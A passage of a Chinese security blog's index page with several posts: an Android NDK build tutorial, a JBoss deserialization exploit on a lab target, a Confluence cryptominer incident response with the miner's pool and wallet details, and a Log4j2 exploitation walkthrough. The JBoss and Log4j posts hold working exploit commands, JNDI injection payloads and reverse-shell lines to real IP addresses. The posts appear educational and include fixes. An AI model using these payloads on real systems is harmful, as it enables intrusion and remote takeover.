-pie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须在文件结尾定义编译类型，指定生成的静态库或者共享库在运行时依赖的共享库模块列表。</span></span><br><span class="line"><span class="comment"># BUILD_SHARED_LIBRARY 共享库，供java或者其余共享库调用</span></span><br><span class="line"><span class="comment"># BUILD_STATIC_LIBRARY 静态库，供共享库调用，不能直接被java调用</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_SHARED_LIBRARY)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>fPIC和fPIE</p>
<p>-fPIC与-fpic都是在编译时加入的选项，用于生成位置无关的代码(Position-Independent-Code)。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对固定地址的访问都通过全局偏移表(GOT)来实现。-fPIC和-fpic最大的区别在于是否对GOT的大小有限制。-fPIC对GOT表大小无限制，所以如果在不确定的情况下，使用-fPIC是更好的选择。<br>-fPIE与-fpie是等价的。这个选项与-fPIC/-fpic大致相同，不同点在于：-fPIC用于生成动态库，-fPIE用与生成可执行文件。再说得直白一点：-fPIE用来生成位置无关的可执行代码。</p>
</blockquote>
<blockquote>
<p>pie：随机地址。</p>
</blockquote>
<h2 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最经常使用的APP_ABI字段：指定须要基于哪些CPU平台的.so文件</span></span><br><span class="line"><span class="comment"># 常见的平台有armeabi x86 mips，其中移动设备主要是armeabi平台</span></span><br><span class="line"><span class="comment"># 默认状况下，Android平台会生成全部平台的.so文件，即同APP_ABI := armeabi x86 mips</span></span><br><span class="line"><span class="comment"># 指定CPU平台类型后，就只会生成该平台的.so文件，即上述语句只会生成armeabi平台的.so文件</span></span><br><span class="line"><span class="comment"># APP_ABI := all armeabi armeabi-v7a mips x86</span></span><br><span class="line">APP_ABI := armeabi-v7a</span><br><span class="line">APP_PLATFORM := android-23</span><br><span class="line"></span><br><span class="line"><span class="comment"># Android.mk设置可能不起效果，放在这里设置</span></span><br><span class="line">APP_PIE := true</span><br><span class="line"><span class="comment"># 其他可选</span></span><br><span class="line"><span class="comment">#APP_STL := c++_static</span></span><br><span class="line"><span class="comment">#APP_CPPFLAGS := -fexceptions -frtti</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Application.mk</code>中部分设置已经无效了，需要在<code>build.gradle(Module: app)</code>中的<code>android &gt; defaultConfig</code>声明这些参数的值。</p>
</blockquote>
<h2 id="CPP文件"><a href="#CPP文件" class="headerlink" title="CPP文件"></a>CPP文件</h2><p>这里主要是源码的编写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">helloWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">999</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="项目设置"><a href="#项目设置" class="headerlink" title="项目设置"></a>项目设置</h2><ul>
<li><p>添加编译cpp工程的NDK目录</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-34-130.png" alt="image-20211224233448071"></p>
</li>
<li><p>指明<code>Android.mk</code>的路径。</p>
<p>在<code>build.gradle(Module: app)</code>中指明<code>Android.mk</code>的路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    compileSdk 22</span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId &quot;com.example.cmake&quot;</span><br><span class="line">        minSdk 21</span><br><span class="line">        targetSdk 22</span><br><span class="line">        versionCode 1</span><br><span class="line">        versionName &quot;1.0&quot;</span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled false</span><br><span class="line">            proguardFiles getDefaultProguardFile(&#x27;proguard-android-optimize.txt&#x27;), &#x27;proguard-rules.pro&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line">        ndkBuild &#123;</span><br><span class="line">            path file(&#x27;src/main/jni/Android.mk&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    compileOptions &#123;</span><br><span class="line">        sourceCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">        targetCompatibility JavaVersion.VERSION_1_8</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>在要使用的NDK版本中找到<code>ndk-build</code>，将前面添加入环境变量。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-26-564.png" alt="image-20211224232639494"></p>
<p>在makefile目录下输入命令<code>ndk-build</code>。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-44-476.png" alt="image-20211224234440421"></p>
<p>编译生成lib以及中间文件在上级目录。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-46-315.png" alt="image-20211224234633262"></p>
<h2 id="IDA查看"><a href="#IDA查看" class="headerlink" title="IDA查看"></a>IDA查看</h2><p>用IDA查看编译出来的库，只有一个我们编写的函数，直接F5查看源码。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-49-433.png" alt="image-20211224234925397"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-24T09:49:20.000Z" title="2021/12/24 下午5:49:20">2021-12-24</time>发表</span><span class="level-item"><time dateTime="2021-12-24T09:55:26.951Z" title="2021/12/24 下午5:55:26">2021-12-24</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/vulfocus/">vulfocus</a></span><span class="level-item">2 分钟读完 (大约293个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/24/vulfocus/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/">jboss反序列化(CVE-2015-7501)</a></h1><div class="content"><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 红帽 JBoss A-MQ 6.x；BPM 套件 (BPMS) 6.x；BRMS 6.x 和 5.x；数据网格（JDG）6.x；数据虚拟化 (JDV) 6.x 和 5.x；企业应用平台 6.x、5.x 和 4.3.x；保险丝 6.x; 保险丝维修工程 (FSW) 6.x；运营网络（JBoss ON）3.x；传送门 6.x；SOA 平台 (SOA-P) 5.x；网络服务器（JWS）3.x；红帽 OpenShift/xPAAS 3.x；和 Red Hat Subscription Asset Manager 1.3 允许远程攻击者通过与 Apache Commons Collections (ACC) 库相关的精心设计的序列化 Java 对象执行任意命令。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 JavaDeserH2HC工具生成序列化数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line"></span><br><span class="line">java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port</span><br><span class="line"></span><br><span class="line"> curl http://vulfocus.fofa.so:38046/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211224175451260.png" alt="image-20211224175451260"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-17T03:33:39.000Z" title="2021/12/17 上午11:33:39">2021-12-17</time>发表</span><span class="level-item"><time dateTime="2021-12-23T07:38:01.911Z" title="2021/12/23 下午3:38:01">2021-12-23</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Security/">Security</a></span><span class="level-item">6 分钟读完 (大约932个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/17/web-security/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/">记confluence的一次溯源</a></h1><div class="content"><h1 id="记一次confluence挖矿溯源"><a href="#记一次confluence挖矿溯源" class="headerlink" title="记一次confluence挖矿溯源"></a>记一次confluence挖矿溯源</h1><h1 id="1、背景概述"><a href="#1、背景概述" class="headerlink" title="1、背景概述"></a>1、背景概述</h1><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled.png" alt="Untitled"></p>
<h1 id="2、事件分析"><a href="#2、事件分析" class="headerlink" title="2、事件分析"></a>2、事件分析</h1><p>该阿里云的系统客户部署一套了线上的confluence系统，且该系统是部署于我司的虎盾零信任安全访问系统内的，对其公网应用接口的暴露面进行了严格收敛。据得知客户在前天刚好将该收敛系统短暂暴露在公网中，增加其被攻击的可能性，导致最后被注入挖矿病毒。</p>
<p>前期获取客户某员工用户登录账户，获取当前使用的版本为<strong>Confluence 7.9.3</strong></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%201.png" alt="Untitled"></p>
<p>根据该系统版本，在互联网中发现该系统存在远程代码执行漏洞（CVE-2021-26084），且该系统漏洞在八月底被黑产大规模利用执行挖矿程序。</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%202.png" alt="Untitled"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%203.png" alt="Untitled"></p>
<h1 id="3、攻击分析"><a href="#3、攻击分析" class="headerlink" title="3、攻击分析"></a>3、攻击分析</h1><p>查看系统进程，发现恶意运行进程 ps -ef</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%204.png" alt="Untitled"></p>
<p>根据阿里云告警提示的路径该文件创建的时间为 Dec 13 12:42</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%205.png" alt="Untitled"></p>
<p>下载该路径文件获取矿池地址<a target="_blank" rel="noopener" href="http://j0llychic.com:9999/">j0llychic.com:9999</a></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%206.png" alt="Untitled"></p>
<p>获取该矿池的IP地址165.232.129.60定位为美国的一个矿池地址</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%207.png" alt="Untitled"></p>
<p>用户名和密码：</p>
<p>“user”: “47W42XBUVVm3Nwc1h6dqN9YJm8XiCR5yzBpeiWjpUdAdJdpxT4bHVnoczTDvdG1xtsF3YSD1hJviq5bLFNTPVMcj7sNKvs4”,<br>“pass”: “82b1ee75afa6”,</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%208.png" alt="Untitled"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%209.png" alt="Untitled"></p>
<p>查看了一下目前恶意进程trace运行情况，该进程cpu占用率为15%，并未太高</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2010.png" alt="Untitled"></p>
<p>系统日志中目前并未发现其他的可疑连接及运行进程</p>
<p>且confluence日志中也并未发现可疑的请求日志记录</p>
<p>目前大概率怀疑黑产是通过CVE-2021-26084漏洞部署的远程挖矿程序，且清空了相应的请求记录</p>
<h1 id="4、病毒清理"><a href="#4、病毒清理" class="headerlink" title="4、病毒清理"></a>4、病毒清理</h1><h2 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep trace</span><br><span class="line"><span class="built_in">kill</span> -9 14387</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2011.png" alt="Untitled"></p>
<h2 id="文件清理"><a href="#文件清理" class="headerlink" title="文件清理"></a>文件清理</h2><p>rm -rf /root/c3pool/</p>
<p>恶意进程不存在</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2012.png" alt="Untitled"></p>
<p>矿池连接已不存在</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2013.png" alt="Untitled"></p>
<h1 id="5、漏洞复现"><a href="#5、漏洞复现" class="headerlink" title="5、漏洞复现"></a>5、漏洞复现</h1><p>漏洞验证，该系统存在<code>CVE-2021-26084</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217113141317.png" alt="image-20211217113141317"></p>
<p>无虎盾收敛，应用面暴露，直接利用</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112917496.png" alt="image-20211217112917496"></p>
<p>虎盾收敛应用暴露面，已知应用和版本漏洞的情况下，未达成利用</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112939883.png" alt="image-20211217112939883"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112948533.png" alt="image-20211217112948533"></p>
<h1 id="6、总结分析"><a href="#6、总结分析" class="headerlink" title="6、总结分析"></a>6、总结分析</h1><p>该客户系统部署于虎盾零信任安全产品体系下，并未遭受任何攻击，很好的对应用在公网的访问权限进行了严格限制和收敛。由于系统的短暂公网暴露，且该系统存在较新的版本漏洞，而遭受了此次严重的攻击，被黑客部署了挖矿病毒。</p>
<h1 id="7、防范措施"><a href="#7、防范措施" class="headerlink" title="7、防范措施"></a>7、防范措施</h1><h2 id="升级系统版本"><a href="#升级系统版本" class="headerlink" title="升级系统版本"></a>升级系统版本</h2><p>目前官方已在高版本中修复了该漏洞，请受影响的用户升级至安全版本。</p>
<p><a target="_blank" rel="noopener" href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives</a></p>
<p>安全版本列表</p>
<ul>
<li>Atlassian Confluence Server/Data Center 6.13.23</li>
<li>Atlassian Confluence Server/Data Center 7.4.11</li>
<li>Atlassian Confluence Server/Data Center 7.11.6</li>
<li>Atlassian Confluence Server/Data Center 7.12.5</li>
<li>Atlassian Confluence Server/Data Center 7.13.0</li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-11T07:39:48.000Z" title="2021/12/11 下午3:39:48">2021-12-11</time>发表</span><span class="level-item"><time dateTime="2021-12-28T05:24:27.994Z" title="2021/12/28 下午1:24:27">2021-12-28</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Security/">Security</a></span><span class="level-item">4 分钟读完 (大约662个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/">log4j2RCE(CVE-2021-44228)漏洞利用与分析</a></h1><div class="content"><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h2><p>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围:"></a>影响范围:</h2><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h3><p>编写本地<code>exp</code>类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// System.out.print(&quot;正在执行命令&quot;);</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// String[] commands = &#123;&quot;bash&quot;, &quot;-i&quot;, &quot;&gt;&amp;&quot;, &quot;/dev/tcp/139.196.234.164/5555 0&gt;&amp;1&quot;&#125;;</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;Calc&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            System.out.println(<span class="string">&quot;正在执行命令&quot;</span>);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地编译为<code>class</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac exp.java</span><br></pre></td></tr></table></figure>

<p>使用<code>marshalsec</code>本地启用恶意监听服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.1.81:8000/#exp&quot;</span> 7788</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155305869.png" alt="image-20211223155305869"></p>
<p>使用<code>Python3</code>在恶意类文件路径下启动一个简易<code>http</code>服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155241001.png" alt="image-20211223155241001"></p>
<p>插入恶意<code>payload</code>执行，触发命令执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://192.168.1.81:7788/exp&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155523118.png" alt="image-20211223155523118"></p>
<h3 id="线上靶机复现-shell反弹"><a href="#线上靶机复现-shell反弹" class="headerlink" title="线上靶机复现-shell反弹"></a>线上靶机复现-shell反弹</h3><p>使用<code>JNDI</code>启动恶意服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="string">&quot;x.x.x.x&quot;</span> -p 6666</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155823005.png" alt="image-20211223155823005"></p>
<p>构造攻击payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;jndi:ldap://x.x.x.x:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</span><br></pre></td></tr></table></figure>

<p>注：后面command需要经过一次base64编码，两次URL编码处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command: bash -i &gt;&amp; /dev/tcp/x.x.x.x/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160404738.png" alt="image-20211223160404738"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160320680.png" alt="image-20211223160320680"></p>
<h3 id="线上靶机复现-回显输出"><a href="#线上靶机复现-回显输出" class="headerlink" title="线上靶机复现-回显输出"></a>线上靶机复现-回显输出</h3><p>使用<code>vulfocus</code>上的靶机测试</p>
<p>用<code>Log4j2 jndi injection fuzz tool</code>对主机进行模糊测试，找到传参点在<code>header</code>头</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131736368.png" alt="image-20211228131736368"></p>
<p>使用<code>JNDI</code>启动恶意服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="string">&quot;x.x.x.x&quot;</span> -p 6666</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131104816.png" alt="image-20211228131104816"></p>
<p>抓包修改<code>header</code>为攻击<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Api-Version: $&#123;$&#123;env:NaN:-j&#125;ndi$&#123;env:NaN:-:&#125;$&#123;env:NaN:-l&#125;dap$&#123;env:NaN:-:&#125;//139.196.234.164:1389/TomcatBypass/TomcatEcho&#125;</span><br><span class="line">cmd:ls</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228132305371.png" alt="image-20211228132305371"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>截止到目前，网上的修复方法大致是这些：</p>
<p>补丁链接: <a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a></p>
<p>1.添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p>
<p>2.在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p>
<p>3.JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/5/">5</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="greetdawn"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">greetdawn</p><p class="is-size-6 is-block">Web Security</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Singapore</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">48</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">14</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">45</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Greetdawn" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Greetdawn"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://fofa.info" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Fofa</span></span><span class="level-right"><span class="level-item tag">fofa.info</span></span></a></li><li><a class="level is-mobile" href="https://www.shentoushi.top" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">渗透师</span></span><span class="level-right"><span class="level-item tag">www.shentoushi.top</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Linux/"><span class="level-start"><span class="level-item">Linux</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="level-start"><span class="level-item">PHP代码审计</span></span><span class="level-end"><span class="level-item tag">12</span></span></a></li><li><a class="level is-mobile" href="/categories/Security/"><span class="level-start"><span class="level-item">Security</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/categories/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul><li><a class="level is-mobile" href="/categories/android/jni/"><span class="level-start"><span class="level-item">jni</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="level-start"><span class="level-item">python代码审计</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/vulfocus/"><span class="level-start"><span class="level-item">vulfocus</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">web安全</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">内网渗透</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"><span class="level-start"><span class="level-item">安全竞赛</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"><span class="level-start"><span class="level-item">工具开发</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"><span class="level-start"><span class="level-item">微信公众号</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">攻防渗透</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><span class="level-start"><span class="level-item">环境配置</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul 